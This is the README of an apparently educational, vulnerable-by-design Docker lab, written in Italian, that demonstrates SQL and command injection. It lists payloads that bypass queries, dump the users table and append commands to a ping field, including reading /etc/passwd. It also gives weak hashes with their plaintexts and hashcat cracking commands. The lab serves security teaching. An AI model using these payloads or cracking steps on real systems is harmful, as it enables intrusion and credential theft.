# OWASP A03 – Injection Lab

Laboratorio “vulnerable by design” che dimostra due vulnerabilità della categoria OWASP A03: SQL Injection e Command Injection. L’applicazione gira tramite `docker-compose` ed espone l’interfaccia su `http://localhost:8083/`.

## Avvio ambiente

```bash
docker-compose up -d
```

## Componenti vulnerabili

### 1. Ricerca Prodotti (`search.php`)

- Query concatenata direttamente con l’input `search_term`.
- Nessuna parametrizzazione né escaping.

**Hint manuali**

| Obiettivo | Payload |
|-----------|---------|
| Bypass login/query | `' OR '1'='1` |
| Esfiltrare dati da `users` | `' UNION SELECT username, password_hash, role FROM users-- -` |

### 2. Diagnostica di Rete (`ping.php`)

- Input passato al comando `ping` dopo una blacklist incompleta (`;`, `|`, `&&`, `||`).
- È possibile eseguire comandi arbitrari usando caratteri non filtrati o la command substitution.

**Hint manuali**

| Obiettivo | Payload |
|-----------|---------|
| Eseguire un comando aggiuntivo | `8.8.8.8 & whoami` |
| Enumerare privilegi | `8.8.8.8 & id` |
| Esfiltrare file | `8.8.8.8 & cat /etc/passwd` |
| Usare command substitution | `8.8.8.8$(whoami >&2)` |

### 3. Hash Password Deboli

Il database contiene hash di password deboli facilmente rompibili con hashcat. Dopo aver estratto gli hash tramite SQL Injection, è possibile dimostrare come anche algoritmi "sicuri" siano vulnerabili se le password sono semplici.

**Hash presenti nel database:**

| Username | Algoritmo | Hash | Password reale |
|----------|-----------|------|----------------|
| admin | MD5 | `5f4dcc3b5aa765d61d8327deb882cf99` | `password` |
| b.rossi | SHA1 | `7c4a8d09ca3762af61e59520943dc26494f8941b` | `123456` |
| m.verdi | MD5 | `21232f297a57a5a743894a0e4a801fc3` | `admin` |
| s.bianchi | SHA256 | `65e84be33532fb784c48129675f9eff3a682b27168c0ea744b2cf58ee02337c5` | `qwerty` |
| g.neri | MD5 | `40be4e59b9a2a2b5dffb918c0e86b3d7` | `welcome` |

**Come rompere gli hash con hashcat:**

### Passo 1: Estrarre gli hash tramite SQL Injection

```sql
' UNION SELECT username, password_hash, role FROM users-- -
```

### Passo 2: Salvare gli hash in file separati per tipo

Crea file separati per ogni tipo di hash:

**md5_hashes.txt:**
```
5f4dcc3b5aa765d61d8327deb882cf99
21232f297a57a5a743894a0e4a801fc3
40be4e59b9a2a2b5dffb918c0e86b3d7
```

**sha1_hashes.txt:**
```
7c4a8d09ca3762af61e59520943dc26494f8941b
```

**sha256_hashes.txt:**
```
65e84be33532fb784c48129675f9eff3a682b27168c0ea744b2cf58ee02337c5
```

### Passo 3: Comandi hashcat per ogni tipo

#### MD5 (Mode 0) - Veloce (secondi)
```bash
# Cracking base con dizionario
hashcat -m 0 md5_hashes.txt rockyou.txt

# Con regole (più efficace)
hashcat -m 0 md5_hashes.txt rockyou.txt -r rules/best64.rule

# Mostra risultati
hashcat -m 0 md5_hashes.txt rockyou.txt --show

# Output formattato
hashcat -m 0 md5_hashes.txt rockyou.txt --show --outfile-format 2
```

#### SHA1 (Mode 100) - Veloce (minuti)
```bash
# Cracking base
hashcat -m 100 sha1_hashes.txt rockyou.txt

# Con regole
hashcat -m 100 sha1_hashes.txt rockyou.txt -r rules/best64.rule

# Mostra risultati
hashcat -m 100 sha1_hashes.txt rockyou.txt --show
```

#### SHA256 (Mode 1400) - Veloce con password semplici (minuti)
```bash
# Cracking base
hashcat -m 1400 sha256_hashes.txt rockyou.txt

# Con regole
hashcat -m 1400 sha256_hashes.txt rockyou.txt -r rules/best64.rule

# Mostra risultati
hashcat -m 1400 sha256_hashes.txt rockyou.txt --show
```

### Passo 4: Comandi utili

```bash
# Verificare lo stato del cracking
hashcat -m 0 md5_hashes.txt rockyou.txt --status

# Cracking con attacco a forza bruta (lento, solo per demo)
hashcat -m 0 md5_hashes.txt -a 3 ?a?a?a?a?a?a

# Salvare i risultati in un file
hashcat -m 0 md5_hashes.txt rockyou.txt --outfile cracked.txt

# Rimuovere hash già crackati dalla sessione
hashcat -m 0 md5_hashes.txt rockyou.txt --remove
```

### Tabella riepilogativa comandi hashcat

| Algoritmo | Mode | Comando base | Velocità stimata |
|-----------|------|--------------|-----------------|
| MD5 | 0 | `hashcat -m 0 hashes.txt rockyou.txt` | Secondi |
| SHA1 | 100 | `hashcat -m 100 hashes.txt rockyou.txt` | Minuti |
| SHA256 | 1400 | `hashcat -m 1400 hashes.txt rockyou.txt` | Minuti |
| NTLM | 1000 | `hashcat -m 1000 hashes.txt rockyou.txt` | Secondi |
| bcrypt | 3200 | `hashcat -m 3200 hashes.txt rockyou.txt` | Ore/Giorni* |

\* *bcrypt è lento anche con password semplici, ma dimostra che algoritmi "forti" sono vulnerabili con password deboli*

**Note importanti:**
- Gli hash MD5 sono i più veloci da rompere (secondi)
- SHA1 è ancora veloce (minuti)
- SHA256 con password semplici è comunque veloce (minuti)
- Tutti questi hash sono vulnerabili perché le password sono nel dizionario `rockyou.txt`
- Per scaricare `rockyou.txt`: https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

## Note didattiche

- Non esporre il laboratorio su reti non controllate.
- Usare snapshot o reset frequenti del database (`db/init.sql`) per ripristinare lo stato iniziale.
- Personalizzare gli hint o gli scenari aggiungendo altri payload in questo README.
- Gli hash nel database sono intenzionalmente deboli per scopi didattici.

